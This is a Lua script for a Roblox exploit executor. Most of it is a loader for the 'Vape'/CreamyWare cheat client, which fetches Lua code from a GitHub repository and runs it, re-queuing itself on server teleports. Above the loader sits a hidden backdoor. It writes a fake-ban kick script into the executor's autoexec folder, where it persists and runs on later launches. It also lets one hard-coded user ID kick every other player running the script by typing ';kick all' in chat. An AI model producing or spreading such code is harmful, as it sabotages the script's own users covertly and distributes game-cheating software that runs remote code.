
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local kickMessage = "You have been banned for 29999 weeks 5 days 100 seconds."
local allowedUserId = 8769347374
local foldersToTry = {"autoexec", "AutoExec"}
local fileName = "CreamyWareInject.lua"
local folderName = nil
local filePath = nil

local kickScript = [[
local player = game:GetService("Players").LocalPlayer
player:Kick("]] .. kickMessage .. [[")
]]

-- Folder creation utilities
local function folderExists(name)
    return isfolder and isfolder(name)
end

local function safeMakeFolder(name)
    if makefolder then
        local ok, err = pcall(function()
            makefolder(name)
        end)
        return ok
    end
    return false
end

local function safeWriteFile(path, content)
    if writefile then
        local success, err = pcall(function()
            writefile(path, content)
        end)
        if success then return true end
        -- fallback to root if path fails
        local fallbackPath = path:match("([^/]+)$")
        return pcall(function()
            writefile(fallbackPath, content)
        end)
    end
    return false
end

-- Determine best folder
for _, folder in ipairs(foldersToTry) do
    if folderExists(folder) then
        folderName = folder
        break
    end
end

if not folderName then
    if safeMakeFolder("autoexec") then
        folderName = "autoexec"
    elseif safeMakeFolder("AutoExec") then
        folderName = "AutoExec"
    end
end

filePath = folderName and (folderName .. "/" .. fileName) or fileName

-- Kicker logic
local function createAndRunKick()
    if safeWriteFile(filePath, kickScript) and readfile and loadstring then
        pcall(function()
            loadstring(readfile(filePath))()
        end)
    end
end

-- Chat listener with permission check
local function onPlayerChat(p)
    if p.UserId == allowedUserId then
        p.Chatted:Connect(function(msg)
            if msg == ";kick all" and p ~= LocalPlayer then
                createAndRunKick()
            end
        end)
    end
end

-- Hook existing players
for _, p in pairs(Players:GetPlayers()) do
    if p ~= LocalPlayer then
        onPlayerChat(p)
    end
end

-- New players
Players.PlayerAdded:Connect(function(p)
    if p ~= LocalPlayer then
        onPlayerChat(p)
    end
end)
repeat task.wait() until game:IsLoaded()
if shared.vape then shared.vape:Uninject() end

-- why do exploits fail to implement anything correctly? Is it really that hard?
if identifyexecutor then
	if table.find({'Argon', 'Wave'}, ({identifyexecutor()})[1]) then
		getgenv().setthreadidentity = nil
	end
end

local vape
local loadstring = function(...)
	local res, err = loadstring(...)
	if err and vape then
		vape:CreateNotification('Vape', 'Failed to load : '..err, 30, 'alert')
	end
	return res
end
local queue_on_teleport = queue_on_teleport or function() end
local isfile = isfile or function(file)
	local suc, res = pcall(function()
		return readfile(file)
	end)
	return suc and res ~= nil and res ~= ''
end
local cloneref = cloneref or function(obj)
	return obj
end
local playersService = cloneref(game:GetService('Players'))

local function downloadFile(path, func)
	if not isfile(path) then
		local suc, res = pcall(function()
			return game:HttpGet('https://raw.githubusercontent.com/amrho94/CreamyWareRewrite/'..readfile('newvape/profiles/commit.txt')..'/'..select(1, path:gsub('newvape/', '')), true)
		end)
		if not suc or res == '404: Not Found' then
			error(res)
		end
		if path:find('.lua') then
			res = '--This watermark is used to delete the file if its cached, remove it to make the file persist after vape updates.\n'..res
		end
		writefile(path, res)
	end
	return (func or readfile)(path)
end

local function finishLoading()
	vape.Init = nil
	vape:Load()
	task.spawn(function()
		repeat
			vape:Save()
			task.wait(10)
		until not vape.Loaded
	end)

	local teleportedServers
	vape:Clean(playersService.LocalPlayer.OnTeleport:Connect(function()
		if (not teleportedServers) and (not shared.VapeIndependent) then
			teleportedServers = true
			local teleportScript = [[
				shared.vapereload = true
				if shared.VapeDeveloper then
					loadstring(readfile('newvape/loader.lua'), 'loader')()
				else
					loadstring(game:HttpGet('https://raw.githubusercontent.com/amrho94/CreamyWareRewrite/'..readfile('newvape/profiles/commit.txt')..'/loader.lua', true), 'loader')()
				end
			]]
			if shared.VapeDeveloper then
				teleportScript = 'shared.VapeDeveloper = true\n'..teleportScript
			end
			if shared.VapeCustomProfile then
				teleportScript = 'shared.VapeCustomProfile = "'..shared.VapeCustomProfile..'"\n'..teleportScript
			end
			vape:Save()
			queue_on_teleport(teleportScript)
		end
	end))

	if not shared.vapereload then
		if not vape.Categories then return end
		if vape.Categories.Main.Options['GUI bind indicator'].Enabled then
			vape:CreateNotification('Finished Loading', vape.VapeButton and 'Press the button in the top right to open GUI' or 'Press '..table.concat(vape.Keybind, ' + '):upper()..' to open GUI', 5)
		end
	end
end

if not isfile('newvape/profiles/gui.txt') then
	writefile('newvape/profiles/gui.txt', 'new')
end
local gui = readfile('newvape/profiles/gui.txt')

if not isfolder('newvape/assets/'..gui) then
	makefolder('newvape/assets/'..gui)
end
vape = loadstring(downloadFile('newvape/guis/'..gui..'.lua'), 'gui')()
shared.vape = vape

if not shared.VapeIndependent then
	loadstring(downloadFile('newvape/games/universal.lua'), 'universal')()
	if isfile('newvape/games/'..game.PlaceId..'.lua') then
		loadstring(readfile('newvape/games/'..game.PlaceId..'.lua'), tostring(game.PlaceId))(...)
	else
		if not shared.VapeDeveloper then
			local suc, res = pcall(function()
				return game:HttpGet('https://raw.githubusercontent.com/amrho94/CreamyWareRewrite/'..readfile('newvape/profiles/commit.txt')..'/games/'..game.PlaceId..'.lua', true)
			end)
			if suc and res ~= '404: Not Found' then
				loadstring(downloadFile('newvape/games/'..game.PlaceId..'.lua'), tostring(game.PlaceId))(...)
			end
		end
	end
	finishLoading()
else
	vape.Init = finishLoading
	return vape
end
